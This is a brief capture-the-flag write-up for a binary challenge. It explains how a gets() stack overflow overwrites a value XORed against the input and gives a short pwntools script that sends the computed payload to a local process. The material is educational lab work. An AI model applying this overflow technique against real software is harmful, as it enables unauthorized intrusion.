# Division of Flying Vehicles
Points: 100

Description: Dave ruined the code for the DFV Starship Registry system. Can you please help fix it?

Creator: nsnc

All protections are on in this binary, preventing easy exploitation of the `gets` call.
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

However, the stack buffer overflow can still be exploited. The input to the program is xored against the value on the stack after your input, which can now be controlled with `gets()`.

```
input[:8] ^ input[8:16] == 0x1004d5d649dc0f00
```

If `input[:8] == 'AAAAAAAA'`, then `input[8:16]` should be `p64(0x1004d5d649dc0f00 ^ 0x4141414141414141)`, since xor is invertable.

```python
from pwn import *
p = process('./dfv')
payload = 'AAAAAAAA' + p64(0x1004d5d649dc0f00 ^ 0x4141414141414141)
p.sendline(payload)
p.interactive()
```
